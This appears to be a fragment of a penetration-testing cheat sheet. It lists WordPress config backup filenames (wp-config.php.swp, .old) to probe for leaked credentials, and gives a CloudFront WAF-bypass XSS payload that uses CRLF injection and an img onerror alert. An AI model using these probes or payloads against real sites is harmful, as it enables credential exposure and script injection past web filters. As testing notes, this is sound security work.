
#### WP-Config:

* wp-config.php.swp
* wp-config.php.old

CloudFront Bypass XSS: `">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>`